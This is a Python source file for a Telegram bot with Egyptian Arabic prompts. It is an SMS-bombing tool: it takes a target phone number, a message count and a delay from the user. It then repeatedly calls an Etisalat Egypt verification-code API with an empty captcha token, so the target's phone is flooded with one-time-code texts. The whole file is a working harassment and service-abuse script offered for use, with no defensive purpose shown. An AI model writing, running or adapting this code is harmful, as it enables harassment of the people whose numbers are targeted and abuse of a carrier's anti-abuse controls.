import os
import time
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# -----------------------------
#  Variables from Railway (Environment)
# -----------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN")  # هتحط التوكن في Railway Variables

# -----------------------------
#  Conversation States
# -----------------------------
ASK_NUMBER, ASK_COUNT, ASK_DELAY = range(3)

# -----------------------------
#  Start Command
# -----------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("أهلا 👋\nابعت رقم الموبايل اللي عايز ترسل له الرسائل.")
    return ASK_NUMBER

# -----------------------------
#  Get Number
# -----------------------------
async def get_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["number"] = update.message.text.strip()
    await update.message.reply_text("تمام ✅\nدلوقتي ابعت عدد الرسائل اللي عايز تبعتها:")
    return ASK_COUNT

# -----------------------------
#  Get Count
# -----------------------------
async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text.strip())
        context.user_data["count"] = count
        await update.message.reply_text("تمام ✅\nابعت عدد الثواني بين كل رسالة والتانية:")
        return ASK_DELAY
    except ValueError:
        await update.message.reply_text("❌ من فضلك ابعت رقم صحيح.")
        return ASK_COUNT

# -----------------------------
#  Get Delay + Start Sending
# -----------------------------
async def get_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        delay = int(update.message.text.strip())
        context.user_data["delay"] = delay

        number = context.user_data["number"]
        count = context.user_data["count"]

        await update.message.reply_text(f"🚀 جاري إرسال {count} رسالة للرقم {number} كل {delay} ثانية...")

        # API Details
        url = "https://mab.etisalat.com.eg:11003/Saytar/rest/quickAccess/sendVerCodeQuickAccessV4"
        headers = {
            'Host': "mab.etisalat.com.eg:11003",
            'User-Agent': "okhttp/5.0.0-alpha.11",
            'Connection': "Keep-Alive",
            'Accept': "text/xml",
            'Content-Type': "application/xml",
        }

        # Loop to send SMS
        for i in range(count):
            payload = f"<?xml version='1.0' encoding='UTF-8' standalone='no' ?><sendVerCodeQuickAccessRequest><dial>{number}</dial><hCaptchaToken></hCaptchaToken><udid></udid></sendVerCodeQuickAccessRequest>"
            try:
                response = requests.post(url, data=payload, headers=headers, timeout=10)
                if "true" in response.text:
                    await update.message.reply_text(f"✅ رسالة {i+1} اتبعتت.")
                else:
                    await update.message.reply_text(f"⚠️ رسالة {i+1} فشلت.")
            except Exception as e:
                await update.message.reply_text(f"❌ خطأ في رسالة {i+1}: {str(e)}")

            time.sleep(delay)

        await update.message.reply_text("🎉 خلصت كل الرسائل.")

        return ConversationHandler.END

    except ValueError:
        await update.message.reply_text("❌ من فضلك ابعت رقم صحيح.")
        return ASK_DELAY

# -----------------------------
#  Cancel Command
# -----------------------------
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ تم إلغاء العملية.")
    return ConversationHandler.END

# -----------------------------
#  Main Function
# -----------------------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
            ASK_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
            ASK_DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)

    print("✅ Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()